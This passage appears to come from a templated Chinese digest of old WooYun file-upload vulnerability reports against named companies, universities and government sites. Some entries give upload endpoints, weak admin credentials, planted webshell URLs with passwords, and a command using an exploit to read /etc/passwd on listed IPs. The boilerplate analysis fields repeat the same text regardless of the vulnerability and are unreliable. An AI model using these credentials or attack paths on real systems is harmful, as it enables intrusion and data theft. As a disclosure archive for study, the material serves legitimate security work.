3. 验证漏洞响应

**详情**: http://www.wahaha.com.cn:8080/tz/jsp/tz/active2009/index.jsp在这个地址注册个账户，然后上传图片，在jsp木马头 加个GIF89a能直接上传成功

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 建议再上传限制这里，严格一些，不能直接的判断图片头，而不判断后缀名
---

---
### [wooyun-2014-074364] 中国电信某省分站文件任意上传漏洞
**厂商**: 中国电信综合平台开发运营中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.该上传点应该属于权限绕过或者是编辑器漏洞

**POC**: 一：上传点地址：1.http://fj.189.cn/ewebeditor/ewebeditor.htm?id=body&style=popup2.http://fj.189.cn/ewebeditor/ewebeditor.htm?id=body&3.http://fj.189.cn/ewebeditor/ewebeditor.htm这三个地址打开页面是一样的。直接上图二.这里说明一下，打开的时候，有些浏览器会提示你安装/ewebeditor编辑器环境，然后安装就可以了，还有就是要先点击文本然后再点击设计，才会出现可编辑的页面，最后点击上传按钮即可。三：然后上传，可以上传成功，但是发现是已时

**绕过**: 过滤绕过

**修复**: 虽然没有拿到shell,但是希望多给的rank,检测那么辛苦，哈哈。及时修复
---

---
### [wooyun-2010-0391] 网易某分站权限绕过以及文件上传漏洞
**厂商**: 网易 | **年份**: 2010 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录链接：http://design.163.com/ria/login.php在页面上可以下载到审批人联系人方式的压缩文件，通过里面文本文档中的联系人方式可以登录到系统中区。通过新添加广告可以找到上传文件的地方，该处对上传的文件类型无任何检查和过滤，造成可以直接上传PHP类型的WEB后门，通过后门可以查看管理服务器文件，并执行命令等。由现在的两处问题可以看出来该网站中还应该存在其他的安全问题。

**POC**: http://design.163.com/ria/login.php通过leiwang用户登录上传WEB后门http://design.163.com/riahttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/71/2010-09-01/1283308117.php

**绕过**: 直接利用

**修复**: 严格过滤输入输入
---

---
### [wooyun-2013-036776] 7k7k某分站任意文件上传（可传html钓鱼）
**厂商**: 奇客星空 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某站任意文件上传漏洞连接：http://news.7k7k.com/ceshi/上传图片可上传任意文件抓包修改后缀发现php上传后无法解析，上传个html吧钓鱼，挂马这个还是没问题的

**POC**: 某站任意文件上传漏洞连接：http://news.7k7k.com/ceshi/上传图片可上传任意文件抓包修改后缀发现php上传后无法解析，上传个html吧钓鱼，挂马这个还是没问题的

**绕过**: 直接利用

**修复**: 不要以为控制不解析php就不做文件上传后缀控制了
---

---
### [wooyun-2015-0138284] 逐浪cms 某分站文件上传
**厂商**: 逐浪CMS | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://stu.zoomla.cn/guestbook/Default.aspx?CateID=2这个页面中有个编辑器,点击超链接可以止传附件,抓包修改后缀 可上传aspx文件代码写入rar抓包修改后缀

**POC**: http://stu.zoomla.cn/UploadFiles/UserUpload/2015/9/201509010711193145.aspx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-089922] 北京某企业征信平台漏洞（刚刚拿到央行的征信牌照）
**厂商**: 北京某企业征信平台 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址 http://www.21315.com/先随便注册一个帐号吧后台http://credit.21315.com.cn/sysadmin/login.html

**POC**: 随便上传文件asp  php 等等  看图说话吧直接拿下了  剩下的随意可以利用吧  里面那么多企业信息  大家可以发挥想象吧 你懂得

**绕过**: 直接利用

**修复**: 一看程序就是外包的（FytCms二次开发的）  请个安全人员  最好用java开发吧
---

---
### [wooyun-2016-0167308] Pogo看演出某处任意文件上传
**厂商**: Pogo看演出 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: APP的上传头像处，可上传任意文件上传一句话后，可连接老出错。就测试到这

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 控制上传格式
---

---
### [wooyun-2012-06479] PPTV的一个FCK 漏洞
**厂商**: PPTV(PPlive) | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://alliance.pptv.com/include/fckeditor/editor/fckeditor.html功能完全 FCK 突破什么的 就不用我说了吧http://alliance.pptv.com/images/down.jpg/1.php再搭配上这个 基本秒杀了吧 - -我没有入侵 但是不说明漏洞不存在 如果非得要我入侵了 才能说明漏洞的严重 那我也没什么好说的了

**POC**: http://alliance.pptv.com/include/fckeditor/editor/fckeditor.html功能完全 FCK 突破什么的 就不用我说了吧http://alliance.pptv.com/images/down.jpg/1.php再搭配上这个 基本秒杀了吧 - -

**绕过**: 直接利用

**修复**: nginx解析修复 10年前的东西了- -fak  修复就不多说了网上教程一大堆
---

---
### [wooyun-2013-028004] JBR-CMS 5.0任意目录遍历/删除文件漏洞（中南财经政法大学多个漏洞）
**厂商**: JBR-CMS | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、 JBR-CMS 5.0 FileList.aspx任意目录遍历：除了这个帖子WooYun: JBR-CMS Version:V5.0 直接越权添加管理员与任意目录遍历漏洞里面说的两个之外，无意间发现还有一个FileList.aspx，列出来的功能更详细，还可以随意删除文件http://mba.znufe.edu.cn/AdminManage/FileManagement/FileList.aspx?dir=D:\www.znmba.com\web_new\Upload\HtmlEditor\file\asp.asp2、中南财经政法大学数据库备份可下载：http://mba.znufe.edu.cn/2013-7-5.rarhttp://mba.znufe.edu.cn/2013-1-31.rarhttp://mba.znufe.edu.cn/upfile.rarIIS 6.0解析漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更改逻辑为只有管理员登录后才能查看文件
---

---
### [wooyun-2015-0135244] 同济大学任意文件上传
**厂商**: 同济大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 同济大学任意文件上传http://202.120.189.171/register   上传头像处  抓包改后缀上传  可上传任意文件

**POC**: 以shell   请自行删除 http://202.120.189.171/https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/logo/823.jsp

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0131529] 中国医药商业协会任意上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: ..见证明

**POC**: http://223.4.9.110//Plugin/Upload/UploadTongYong.aspx任意上传点，可上传aspx直接上传aspx

**绕过**: 直接利用

**修复**: 限制访问
---

---
### [wooyun-2014-062832] 成都市规划局某业务后台权限绕过+任意上传文件
**厂商**: 成都市规划局 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 箭头指向位置得到调用的地址直接未授权访问不好意思测试了几个小文件，请维护修补漏洞的时候删除吧。文件上传后，得到的地址是另外一台服务器的地址，没有访问权限。这个可以添加和修改，可以任意修改。这个弱口令：http://182.139.134.42/ghzx/    admin   admin

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个简单，喊开发厂家人员修补！
---

---
### [wooyun-2015-0159346] 海信集团某系统弱口令后台任意文件上传
**厂商**: hisense.com | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://qr.hisense.com/海信集团二维码平台  存在弱口令admin  111111登陆以后可以看到各种内部二维码借口和内部的素材是不是可以把我的收款二维码链接放上去，然后发布出去？？？？ YY一下~~~~~素材发布出，新建素材，选择传文件POST /homehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/file/0 HTTP/1.1Host: qr.hisense.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改~~~~~
---

---
### [wooyun-2013-032754] 7天连锁酒店fckeditor目录读取
**厂商**: 7天连锁酒店 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这两个页面直接爆出了绝对路径http://www.7daysinn.cn/product_intro.htmlhttp://www.7daysinn.cn/cooperate.html呃为啥都在根域一个是linux路径一个是windows的求解下面两个fckeditor的二次上传漏洞 目测被万人骑了。。。http://in.7daysinn.cn/fckeditor/editor/filemanager/connectors/test.html#http://partner.7daysinn.cn/FCKeditor/editor/filemanager/connectors/test.html#小弟测试了一下上传漏洞虽然能写入，貌似服务器做个限制或者有什么waf 导致马儿不能正常运行。不过还是补上的比较好

**POC**: (见原文)

**绕过**: 直接利用

**修复**: fckeditor 的测试页面没啥用就删掉吧
---

---
### [wooyun-2016-0213240] 广州长城宽带OA系统任意文件上传已入远程桌面泄漏大量办公信息
**厂商**: 长城宽带 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/ 弱口令zhangke/123456进入：写邮件处发现fckeditor上传之菜刀连接之netstat -abn 寻找termsrv（远程桌面） 端口位于25608，添加用户连接之涉及文档请看漏洞证明

**POC**: 长宽安全真心不敢恭维…

**绕过**: 直接利用

**修复**: 不用我说
---

---
### [wooyun-2014-082239] 社会科学文献出版社另一站敏感信息泄露+编辑器上传
**厂商**: ssap.com.cn | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是所有用户的登录信息：http://www.ssapchina.com/api/log.txt编辑器：此处没什么危害，算是附带提一下，只是上传的文件可以被下载，目录已经禁止脚本执行了，上传等不能跨目录http://www.ssapchina.com/admin/ckfinder/ckfinder.html?action=js&f

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 禁止目录被访问
---

---
### [wooyun-2016-0213328] 某市住房城乡建设局存在Fck上传漏洞jsp文件无限制上传已成马场
**厂商**: 某市住房城乡建设局存在Fck上传漏洞jsp文件无限制上传 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 差WB

**POC**: 1.http://**.**.**.**/漏洞地址就在这里啦fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector在后缀添加上就可以。已经是养马场了只是你们还不知道。shell地址：http://**.**.**.**/UserFiles/Image/py.jsp 密码wooyun

**绕过**: 直接利用

**修复**: 你们比我更专业
---

---
### [wooyun-2014-087477] 新蓝网旗下某产品任意文件上传漏洞危急新蓝网图片服务器权限
**厂商**: cztv.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在http://www.zjbtv.com/注册用户，然后在爆料中心上传，通过合成图片马，再用burp截包修改后缀名上传！其实之前上传试了很多次！原来菜刀的问题！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 请自己删除webshell
---

---
### [wooyun-2013-035394] 资兴市人民政府文件上传漏洞
**厂商**: 资兴市人民政府 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <form id="frmUpload" enctype="multipart/form-data" action="http://www.zixing.gov.cn/comm_front/email/uploadImageFile_do.jsp" method="post">Upload a new file:<br><input type="file" name="NewFile" size="50"><br><input id="btnUpload" type="submit" value="Upload"></form>构造上传jsp大马

**POC**: http://www.zixing.gov.cn/comm/common/appendix/20130821114005578.jsp

**绕过**: 直接利用

**修复**: 限制上传格式
---

---
### [wooyun-2015-0161231] 学事通任意文件上传下载删除
**厂商**: 学事通 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 学事通偶然看到的一个站，危害之一是可以利用该系统给学生家长群发诈骗短信http://www.njxt.net:800060.190.202.51未授权访问http://www.njxt.net:8000/scmanage/index.aspx?sid=22&uname=0022029http://www.njxt.net:8000/scmanage/index.aspx?sid=52&uname=0193001http://www.njxt.net:8000/scmanage/index.aspx?sid=166&uname=0104060爆破学校ID,403则存在http://www.njxt.net:8000/image/studentimg/166/爆破学校账号应该也行，7位数，这里没有试任意文件下载http://www.njxt.net:8000/ashx/download.ash

**POC**: 从图片文件夹路径看，大概有800个学校，一个学校几百学生，总人数还是很可观的最后连接数据库看看：没有进一步看，SHELL请自行删除。

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2014-076725] 九江学院办公系统上传漏洞
**厂商**: 九江学院 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 话说一同学在你们学校读书，然后没事的时候进去了下他学校官网看了下。。然后随便点了个办公系统。。。看到aspx的。然后扫了下。发现fck编辑器一枚。。http://218.193.224.21/fckeditor/editor/filemanager/browser/default/connectors/test.html直接上传aspx大马。。http://218.193.224.21/UserFiles/File/aspx1.aspx  密码admin

**POC**: img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201409/20142845efc41836fa7cc39c1803cdc4c03e0da4.png" alt="4.png" />我就不做死。。<

**绕过**: 直接利用

**修复**: 装安全狗。。这个你们学校计算机老师比我更懂
---

---
### [wooyun-2014-072700] tom在线游戏下载站任意上传
**厂商**: TOM在线 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: <form  enctype="multipart/form-data" action="" method="post"><input type="file" name="Filedata" size="40" /> <input type="submit"  /></form><?phpif (!empty($_FILES)) {$tempFile = $_FILES['Filedata']['tmp_name'];$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';$targetFile =  str_replace('//','/',$targetPath) . $_FILES['Filedata']['name'];move_uploaded_file($tempFile,iconv('UTF-8'

**POC**: <form  enctype="multipart/form-data" action="" method="post"><input type="file" name="Filedata" size="40" /> <input type="submit"  /></form><?phpif (!empty($_FILES)) {$tempFile = $_FILES['Filedata']['tmp_name'];$targetPath = $_SERVER['DOCUMENT_ROOT'] . $_REQUEST['folder'] . '/';$targetFile =  str_re

**绕过**: 直接利用

**修复**: 虽然回复都是“非常感谢您对TOM在线的帮助，我们会尽快做出处理。我们为支持TOM在线的发布者创建了一个技术交流QQ群：，希望您以及更多的成员加入，大家共同交流。”但是还是提交一下吧”你们比我更专业
---

---
### [wooyun-2015-0157105] 河北工程技术学院任意文件上传漏洞
**厂商**: 河北工程技术学院 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/editor/tiny_mce/plugins/uploda.php，可上传一句话木马，目录传到plugins目录下，使用的是ewebeditor

**POC**: 上传页面无格式过滤，可直接上传php上传成功

**绕过**: 直接利用

**修复**: 过滤上传类型或者关闭此上传插件页面
---

---
### [wooyun-2013-046921] 东软svn源码泄露导致fck任意上传
**厂商**: 东软集团 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wooyun.org/bugs/wooyun-2010-041330根据这个漏洞，http://59.46.220.76/common/.svn/text-base/page_macro.ftl.svn-base发现SVN依旧可以看到源码。然后看到有个fck。嗯。FCK+jsp.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不会修复..
---

---
### [wooyun-2015-0111030] 上海侨务某系统存在任意文件上传及文件遍历漏洞#1
**厂商**: 上海市人民政府侨务办公室 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://bs.qwb.sh.gov.cn/qwb_inter/pages/T_QWB_CHIEFMAIL/new_edit.jspip地址：同jk.qwb.sh.gov.cn，均为211.152.36.83问题原因：fck编辑器不正确配置fck地址：http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../以上文件遍历

**POC**: 文件上传：http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://jk.qwb.sh.gov.cn/qwb_inter/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector需要上传jspx文件类型，jsp有跳转，跨目录传未尝试一句话地址：http://jk.qwb.sh.gov.cn/qwb_inter/UserFiles/Im

**绕过**: 直接利用

**修复**: 正确配置fck，上传点过滤
---

---
### [wooyun-2015-0146646] 禅道任意文件上传（需要账号登陆）
**厂商**: 禅道 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /module/file/control.php：Zip被解压到了tmp/cache/uploadimages/随机命名目录，应用目录结构如下：网站入口在www目录，通过web并不能直接访问tmp目录，所以必须将zip文件自动解压到www。通过实验，可以实现这个目的。具有uploadImages权限的用户组如下：对应的用户组如下（深色背景）取得相应权限的帐号即可利用。另外，http://**.**.**.**/bugs/wooyun-2015-0137380在该版本中也存在，可用来给低权限帐号提升权限。

**POC**: 将webshell命名成较长的文件名（至少要够替换成一定数量的../），这里命名成aaaaaaaaaaaaaaaaa.php，压缩成zip。用16进制编辑器修改zip，如下图。post数据包如下，会在www下生成a.php

**绕过**: 直接利用

**修复**: zip的自动解压容易被利用，保险起见还是删掉该功能。
---

---
### [wooyun-2016-0168145] 拍房网主站存在任意文件上传漏洞
**厂商**: 拍房网 | **年份**: 2016 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/ckfinder/ckfinder.html拍房网主站存在上传 更名漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除上传漏洞 过滤
---

---
### [wooyun-2015-0123573] 环球雅思官方网校存在FCK漏洞
**厂商**: 环球雅思 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 上传功能

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册一个用户然后在用户中心找到上传漏洞然后传个txt吧走人你看到了的,asp的文件夹都有了,后面就不用说了

**POC**: TXT地址;http://www.eng24.com/user_center/answer/images/file/1.txt

**绕过**: 直接利用

**修复**: 管理员自己知道的
---

---
### [wooyun-2014-051159] 中国移动MM应用引擎任意文件上传
**厂商**: 中国移动 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意注册个账号，上传php木马即可查看。只能查看其他开发者源码，暂无修改权限，不知能否再提权。

**POC**: manger.mmapp.cn/PHPJackal.php服务器信息：泄露的二级域名目录，以前2字母为目录：http://1.manger.mmapp.cn/PHPJackal.php?seC=fm&workingdiR=/opt/omae/php_web_root可查看源码:http://1.manger.mmapp.cn/PHPJackal.php?seC=fm&workingdiR=/opt/omae/php_web_root/ma/maro/1http://1.manger.mmapp.cn/PHPJackal.php?seC=edit&filE=install.php&working

**绕过**: 直接利用

**修复**: 现在该引擎开发者还不多，危害性还不大，希望参加尽快修补此漏洞。
---

---
### [wooyun-2012-06675] 用户软件无法提交上传
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 小小的缺陷

**元思考**: 触发信号: 功能测试

**洞察**: 小小的缺陷防护不足，开发者信任前端输入

**测试流程**:
1. 识别小小的缺陷相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-017940] 现金威客网后台弱口令+ewebeditor+RAICO的漏洞
**厂商**: RAICO | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我只是想要个邀请码。。。后台弱口令http://cashtask.com/admin/login.phpadminadmin进入后台后不需验证旧密码可以直接修改密码把原密码给覆盖掉看到一些下载站点上面RAICO这套程序也有4000多个下载次数。。问题如下ewebeditor的漏洞就不多说了。直接输入地址进后台。。。这里可以直接看到服务器配置。。。后台可以修改文件类型直接上传。。可以删除文件。。没测试。。URLhttp://cashtask.com/editor/admin/main.phphttp://cashtask.com/editor/admin/default.php另外。。。支付方面也存在问题。。用hidden传值不经过验证。。chrome下直接修改金额发送过去。。。。

**POC**: 后台弱口令http://cashtask.com/admin/login.phpadminadmin进入后台后不需验证旧密码可以直接修改密码把原密码给覆盖掉URLhttp://cashtask.com/editor/admin/main.phphttp://cashtask.com/editor/admin/default.php

**绕过**: 直接利用

**修复**: 大家都知道。。我只是想要个乌云邀请码o(︶︿︶)o
---

---
### [wooyun-2012-012575] 鲜果网C段多台主机漏洞（php错误设置导致代码执行）
**厂商**: 鲜果网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 参考GaRY大牛在zone发的帖子；http://zone.wooyun.org/content/1060找了几个机器试了试，试了好多机器都没有成功，于是拿起perl写了个多线程的小工具；第一个遭殃的鲜果网的几个机器Wed Sep 19 02:28:03 CST 2012   211.151.83.10Wed Sep 19 02:28:03 CST 2012   211.151.83.7Wed Sep 19 02:28:03 CST 2012   211.151.83.11Wed Sep 19 02:28:03 CST 2012   211.151.83.15

**POC**: ./fcgi_exp read 211.151.83.10 8008 /etc/passwd./fcgi_exp read 211.151.83.7 8008 /etc/passwd./fcgi_exp read 211.151.83.11 8008 /etc/passwd./fcgi_exp read 211.151.83.15 8008 /etc/passwd工具我就不打包了，自己去zone找工具复现下；

**绕过**: 直接利用

**修复**: 参照http://zone.wooyun.org/content/1060应该都懂滴；
---

---
### [wooyun-2014-049522] 山东省科学院自动化研究所弱口令导致整站沦陷
**厂商**: 山东省科学院 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://www.sdia.cn  FTP用户名：admin 密码admin

**绕过**: 直接利用

**修复**: 改密码，清除后门
---

---
### [wooyun-2014-085147] 搜狐畅游内部后台弱口令+注入+任意文件上传（可向全体员工推送消息）
**厂商**: 搜狐畅游 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过嗅探发现一处畅游的天兵系统http://180.149.157.110/home/App但是这个系统可利用的东西比较少,系统上次看和这次变化比较大,看样子新加了不少东西在翻找无果后看到了一个页面http://180.149.157.110/home/App就是他的APP下载页面通过对二维码的解码发现地址http://cyn.changyou.com/cyouApp/versionAdmin/downloadPage.shtml看到地址本能反映就是在后台里面果不其然访问http://cyn.changyou.com/cyouApp/是畅游的内容管理系统然后直接尝试弱密码admin admin好简单,而且没有验证码  爆破都不是难事进入后台权限比较大 可以重置很多密码...这里我就不错尝试,不能影响业务.随后发现有APP的设备管理,可以上传文件,并且可以上传任意文件随后就找了下注入发现查询

**POC**: 如上

**绕过**: 直接利用

**修复**: 重要系统一定要用心
---

---
### [wooyun-2015-0143106] 天安保险某系统存在任意文件上传&目录遍历漏洞
**厂商**: 天安保险股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在天安保险的理赔管理系统地址：http://**.**.**.**/autoclaim该系统使用了fck编辑器，但未正确配置，导致问题产生1#站点目录遍历http://**.**.**.**/autoclaim/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../jsp/managerhttp://**.**.**.**/autoclaim/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../../

**POC**: 2#任意文件上传http://**.**.**.**/autoclaim/editor/filemanager/browser/default/browser.html?Connector=http://**.**.**.**/autoclaim/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector可直接上传jsp马大马地址：http://**.**.**.**/autoclaim/FCKeditor/UserFiles/File/JspSpyJDK5.jsp密码：ninty

**绕过**: 直接利用

**修复**: 正确配置fck
---

---
### [wooyun-2013-038699] 外交部分站上传漏洞加主站目录配置不当
**厂商**: 中华人民共和国外交部 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

